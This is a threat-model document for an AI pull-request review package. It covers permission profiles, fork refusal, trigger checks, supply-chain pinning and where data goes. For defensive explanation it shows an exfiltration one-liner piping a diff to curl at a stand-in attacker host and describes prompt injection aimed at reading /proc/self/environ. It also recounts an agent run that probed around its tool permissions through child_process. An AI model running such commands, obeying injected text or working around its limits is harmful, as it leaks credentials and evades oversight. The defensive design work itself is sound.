# Threat model

The uncomfortable sentence first.

**Without the fork switch described below, this package reviews contributions from people who could
already push to your repository.** It is not a sandbox for untrusted code. What it defends against
is the **content** a run reads: a diff, a pull request title, a body, a comment. It is not a change
to the package, the workflow or the prompt by somebody with write access. Against an author who can
push, nothing here is a boundary, and nothing here pretends to be: they could add a step that echoes
your key.

That is a narrower promise than "AI code review, secured". It is also the promise that can actually
be kept, and the rest of this document is what it buys you.

## The risk

An agent reads text somebody else wrote while the model provider key and a repository token sit in
its process environment. Somewhere in that text may be a sentence addressed to the agent rather than
to a reviewer. Asking the model nicely to ignore such sentences does not remove the risk; the prompts
do ask, and that is a second line, not the first.

The first line is that the agents have nowhere to take anything.

## What the review agents may do

Both diff-reading agents run under the `read-only-no-shell` profile
([`profiles/read-only-no-shell.json`](../profiles/read-only-no-shell.json)):

| | |
| --- | --- |
| `bash` | denied entirely |
| `webfetch`, `websearch` | denied |
| `task` | denied, so there is no sub-agent with different permissions |
| `read` | allowed, except `/proc/**`, `/sys/**`, `.git/**` |
| `edit` | denied, except inside `.pitcrew-run/` |
| `external_directory` | denied |

Each of those has a reason:

**No shell at all, and no allowlist.** An allowlist of read-only commands was tried and rejected,
because it would not have worked. OpenCode matches bash permission patterns against the *entire*
command string (`resources: [input.command]` in `packages/core/src/tool/bash.ts`, where a
parser-based check is still an open TODO), so a rule like `"git diff*"` also matches
`git diff | curl -d @- https://attacker/`. A prefix allowlist is a speed bump, not a boundary.

**`/proc` and `/sys` are where the environment is a file.** `/proc/self/environ` holds the model key.
An agent that may read any path may read that one, and a "read the diff" instruction hidden in a
pull request body would be enough. The agent is handed the diff as a file and never needs either
directory.

**`.git/` because of the token.** Some `actions/checkout` versions leave the repository token inside
`.git/config`.

**Writing is confined to `.pitcrew-run/`, which is git-ignored.** Ignored matters twice: the OpenCode
runtime commits and pushes whatever `git status --porcelain` reports, so a stray file would turn a
review into a commit; and the job runs with `contents: read`, which is the same door closed from the
other side. The action writes the ignore rule into `.git/info/exclude` itself, so it cannot be
forgotten by a consumer who never read this file.

**The profile ships with the package.** This is the part that changed when the bundle became a
package, and it is the strongest property here. The permissions are not a file in your repository
that a pull request could edit; they are read out of the checkout GitHub makes of *this* action, at
the ref you pinned. A pull request that rewrites every file it can reach still cannot give its own
reviewer a shell.

## What the acceptance agent may do

It keeps its shell, and that is not an oversight. It drives a browser through Node; denying `curl`
while allowing `node` would be a boundary in name only. It also holds the credentials of the
environment under test.

So the acceptance agent gets a different rule: run it only where the pull request author is trusted.
Concretely:

- **In a public repository it refuses to start.** The acceptance criteria it works from are the
  linked issue, verbatim, and in a public repository anybody with a GitHub account can write an
  issue; on a comment-triggered run the pull request's title, body and comments reach the prompt as
  well. `PITCREW_ACCEPTANCE_ALLOW_PUBLIC=true` turns the refusal off. Set it only if the previous
  sentence describes a risk you accept.
- **A pull request that starts it by itself must come from a collaborator.** The `review_requested`
  trigger is already a write-or-triage gesture, and the `/acceptance` comment reads the commenter's
  association. The third way in - an ordinary `pull_request`, which is how an orchestrator calls this
  workflow - used to be caught downstream by the runtime's actor check, and on that path the run no
  longer goes through it. So `acceptance-test.yml` states the rule itself: the pull request's
  `author_association` must be `OWNER`, `MEMBER` or `COLLABORATOR`.

  Read what that is worth: `author_association` says collaborator, not collaborator-with-write. It
  keeps an outsider's pull request from starting this agent unattended, which is what the runtime
  check was doing here. It does not tell a read-only collaborator from a writer, and it is not a
  boundary against either: a maintainer requesting the reviewer on somebody's pull request runs the
  agent against that pull request's linked issue, which is the trigger working as designed. The
  refusal in a public repository above is the line that matters.
- The two review agents are unaffected by all of that and keep running in public repositories,
  because the analysis above holds for them: hostile text has nowhere to go.

**A refusal is a norm here, not a wall.** One run met a broken rig - the browser driver was missing -
and spent its whole budget looking for a way to obtain one: the npm registry, a writable directory,
and finally `child_process`, *because* Node's child processes are not what the tool permissions
cover. Its reasoning was correct. `profiles/browser.json` allows `bash`, so there was nothing to
break.

The prompt now says that a refusal is a final answer, that nothing is to be installed, fetched or
repaired, and that a missing piece is a report rather than a task. Read that for what it is: an
instruction to a model, which is a norm and not a boundary. What removed the reason to break it is
`actions/check-browser`, which proves the browser before the model is called. The run stops in
seconds instead of leaving an agent to improvise around a rig that cannot work.

## Forks

**Fork pull requests are refused, not sandboxed.**

The `pull_request` trigger withholds repository secrets from a fork's pull request all by itself, so
an agent there fails for lack of a key. That is the intended outcome, but it is only half the
triggers. An `issue_comment` event **always** runs in the base repository, on its default branch,
with secrets, whatever pull request it names. A maintainer typing `/review` on a fork's pull request
would therefore hand a stranger's diff to an agent holding the model key.

[`scripts/assert-same-repo.mjs`](../scripts/assert-same-repo.mjs) therefore runs first in every
agent run and stops the job when the head branch lives elsewhere. It cannot be a workflow `if:`: the
`issue_comment` payload carries no `head.repo`.

**What this costs.** In an open-source project, where most pull requests come from forks, that is
most of the value. The honest state of things:

| Repository | Trigger | Head branch | Today |
| --- | --- | --- | --- |
| private | `pull_request` | same repo | runs |
| private | `issue_comment` (`/review`) | same repo | runs |
| any | `pull_request` | fork | refused; GitHub withholds the secrets anyway |
| any | `issue_comment` | fork | refused by `assert-same-repo.mjs` |
| public | acceptance test, any trigger | any | refused unless `PITCREW_ACCEPTANCE_ALLOW_PUBLIC=true` |

A reviewed, opt-in path for fork pull requests, with shell-less agents only and behind a GitHub
environment with a required approver, is the obvious next step and is
[tracked as issue #1](https://github.com/deyai-labs/pr-pitcrew/issues/1). It is not in this release
because a convenient version of it would be worse than none: `pull_request_target` is the obvious
answer and the dangerous one, and shipping it without the base-branch checkout for everything
executable is the classic mistake with that event.

Until then: if your repository takes fork contributions, this package reviews the pull requests your
own team opens, and nothing else. Plan for that rather than around it.

A fork review is also a data-protection question and not only a security one: a stranger's diff would
go to the repository operator's model provider. That belongs in the same paragraph as the risk, not
in a footnote.

## Who may trigger a run

- The automatic trigger is `pull_request` on the repository's own branches, and it skips drafts.
- A comment trigger requires the comment's author association to be `OWNER`, `MEMBER` or
  `COLLABORATOR`, and the author not to be a bot. On that path the OpenCode runtime also refuses to
  run for an actor without write access to the repository.
- On `pull_request` there is no check on the actor, and that is a decision rather than an oversight.
  The runtime's collaborator lookup answers `none` for every GitHub App bot, so a pull request opened
  by one - `cursor[bot]`, `github-actions[bot]`, whatever opens pull requests in your repository -
  was never reviewed. What that check was standing in for is still there: a fork gets no secrets from
  GitHub and is refused by `assert-same-repo.mjs`, so the head branch lives in this repository and
  somebody with write access pushed it. See
  [ADR 9](adr/0009-the-pull-request-path-runs-the-cli.md).

  For the two review agents what is given up is not code execution: a user with **read** access can
  open a pull request from an existing branch and spend model budget. They have no shell, no
  `webfetch` and no way to read the process environment, so that is the whole of it. **For the
  acceptance agent it is not**, and that difference is handled where it arises - see "What the
  acceptance agent may do" above, which is where its own trigger check now lives. If the budget
  matters in your repository, add the check to your own workflow rather than relying on the
  runtime's - something like

  ```yaml
  if: contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.pull_request.author_association)
  ```

  around the job that calls Pitcrew. Note what it also does: a bot's pull request has no such
  association either, so this is the setting that brings the original problem back on purpose.

## The branch under review configures nothing

`OPENCODE_DISABLE_PROJECT_CONFIG` is set on every step that starts the runtime: both run paths, the
recovery turn that asks a session for its report, and the transcript read. Without it the runtime reads
`opencode.json` from the working directory, takes `AGENTS.md` or `CLAUDE.md` as system instructions,
and imports `.opencode/tool/*.js` - **JavaScript, into its own process**, the one holding the model
key, for an agent that otherwise has no shell. All three would come from the branch under review.

This was never a boundary against somebody who can push (nothing here is), but it is untrusted text
and untrusted code arriving through a door nobody had to open. The agent may still read an
`AGENTS.md` in the checkout as a file if it wants to; it is no longer handed to it as instructions.
`~/.config/opencode/` is unaffected, which is where the report tool this package installs lives.

The same rule holds for the browser preflight, which is the one other place that calls `require()`.
`actions/check-browser` looks in the image, on the module path, under `npm root -g` and in a
depth-limited search of named roots. **The workspace is not one of them.** A driver found there
would be the reviewed branch's own code, loaded before the fork refusal in `actions/agent` has run.
An image that keeps its driver somewhere else is served by `PITCREW_PLAYWRIGHT_MODULE`, which a
maintainer sets and a pull request cannot.

## The comment trigger reads the base branch's configuration

On `pull_request`, the workflow, the pinned ref and the prompt are the pull request's own files
anyway, and against an author who can push none of that is a boundary.

On `issue_comment` the two come apart, and there the difference is real: such a run starts on the
default branch. The agent's manifest, profile and prompt come from the package at the ref the
*default branch's* workflow pins - not from the head branch the runtime later checks out. A
maintainer typing `/review` on somebody's branch reviews it with the base branch's settings.

The endpoint is not in any file that a branch can reach. It arrives as a repository variable, so no
branch can point the provider at a host that collects the key.

## The supply chain

This is listed here rather than under "limitations", because it is the largest piece of trust the
package asks you to extend.

**The OpenCode runtime is downloaded at run time.** `curl -fsSL https://opencode.ai/install | bash`
runs in a job that holds your model key and the repository token - from a step of
[`actions/agent/action.yml`](../actions/agent/action.yml) on the `pull_request` path, and from the
pinned wrapper action on the comment path. Both set `VERSION`, which the installer honours, so the
download is a known version rather than whatever is newest. But that is a pinned version, **not a
checksum**. The download still comes from that host over TLS, and a compromise of it would execute on
your runner with those secrets present.

What pinning does remove is the automatic part: a new OpenCode release cannot arrive in your
pipeline on its own.

**Pinning policy.** The wrapper action's commit SHA and the `opencode-version` input in
[`actions/agent/action.yml`](../actions/agent/action.yml) belong together and are raised in the same
change. Every third-party action in this repository is pinned to a commit, never to a tag; a test
fails the build if one is not ([`scripts/package.test.mjs`](../scripts/package.test.mjs)).
Dependabot watches them.

**What you should pin.** This package, on a commit SHA, if the moving `v1` tag is more trust than
you want to extend to a repository you do not control. See the README.

**The Playwright image.** The acceptance test runs in `mcr.microsoft.com/playwright`, pinned to a
version tag rather than a digest. It is a container, not a script that runs beside your secrets in
the same process, but it is the environment those secrets live in for that job.

**The Playwright driver is installed from npm.** That image ships the browsers and deletes the
driver that speaks to them - `rm -rf /ms-playwright-agent` is upstream's last layer, and it always
has been. So [`.github/workflows/acceptance-test.yml`](../.github/workflows/acceptance-test.yml)
installs `playwright-core` before the run, which is a second fetch into that job. Three things bound
it, and a change that breaks any of them is a change to this section:

- **The version is not a choice.** It is read out of the image tag and has to parse as an exact
  release, so the driver is the one the baked browsers were built with. A dist-tag or a digest is
  refused rather than installed.
- **No secret is in scope.** Secrets reach exactly one step of that job, `actions/agent`, through
  its `with:`. The install step runs before it and sees none of them. That is weaker than a sandbox
  and stronger than nothing: an npm install script still executes in the job, and a package that
  leaves something behind is not stopped by a later step's secrets arriving after it.
- **The agent still installs nothing.** `actions/check-browser` resolves and launches; it never
  fetches. A model that meets a missing piece writes a report about it, which is the rule 1.2.0 was
  written for and is unchanged.

An image that carries its own driver skips the step entirely: set `PITCREW_PLAYWRIGHT_MODULE`, and
nothing is installed on top of it.

## Where your data goes

Out of the runner, to the model provider **you** configured, and nowhere else:

- the pull request's diff - the whole thing on the first run and on `/review`, the commits since the
  last published review on a push;
- the pull request's title, body and comments, which the runtime puts into the prompt on a
  comment-triggered run. On `pull_request` it does not: the prompt is what this package put in it;
- the linked issue, for the acceptance test;
- whatever files the agent chooses to read from the checkout, including `AGENTS.md` or `CLAUDE.md`;
- for the acceptance test, what it sees in the browser at your `PITCREW_ACCEPTANCE_TARGET_URL`.

Not out of the runner:

- the session transcript. Sharing is refused twice - `"share": "disabled"` in the generated
  configuration, which both paths read, and `share: 'false'` as an input to the wrapper action - so
  nothing is uploaded to opencode.ai. The transcript is written into the run summary of your own
  workflow instead.
- the model key, the repository token and the credentials of the environment under test, other than
  into the processes that need them. They are kept out of the prompt on purpose: the prompt is
  echoed into the run log, so placeholder substitution uses an allowlist rather than the whole
  environment ([`scripts/build-config.mjs`](../scripts/build-config.mjs)).

Two things follow that this project cannot do for you. **The contract with your model provider is
yours**: if your repository contains personal data, the diff going to that provider is a processing
relationship you need an agreement for. And **the choice of provider stays yours** - a European
endpoint, a self-hosted one, or none of the above. This package names no vendor, so it takes no
position. That is a map, not legal advice.

One caveat on the run summary: GitHub masks registered secrets in **log output**, not in the Markdown
page a step writes. The transcript therefore redacts any value it can see under a name that sounds
like a secret (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`), and `TRANSCRIPT_REDACT` adds
names that do not sound like one - which is how a test account's e-mail address is covered.

## Runs are assumed not to share a runner

When the agent writes no report itself, [`scripts/ensure-report.mjs`](../scripts/ensure-report.mjs)
recovers one from OpenCode's newest session - and "newest" means newest in the runner's home
directory. Nothing ties a session to the job that created it.

On a GitHub-hosted runner that is exact anyway: the VM is fresh, OpenCode is installed by the run
that then uses it, and the only session on the machine is this run's. On a **self-hosted runner that
is not ephemeral**, sessions outlive the job that made them. A run whose agent dies before opening
one recovers from whatever was left behind instead - and if that is another repository's job, that
repository's findings are published on this pull request.

Tracked as [issue #11](https://github.com/deyai-labs/pr-pitcrew/issues/11). Until it is fixed, the
mitigation is below.

## Recommended hardening for consumers

- **Put the jobs that hold secrets into a GitHub environment with a required reviewer.** Then a
  person decides before a diff reaches a model. This is the single most useful thing you can add,
  and it is entirely on your side of the line.
- **Give Pitcrew an ephemeral runner**, or one no other repository uses. GitHub-hosted runners are
  ephemeral and need nothing. A reused self-hosted runner can publish another repository's findings
  on your pull request; see above.
- **Pin this package to a commit SHA** and let Dependabot propose the bumps.
- **Keep `contents: read`.** The examples do; there is no reason to widen it.
- **Do not put the acceptance reviewer account in `CODEOWNERS`.** GitHub would request it on every
  pull request, and the walk-through would start by itself, which is the one thing that trigger
  exists to prevent.

## Reporting

See [`SECURITY.md`](../SECURITY.md).
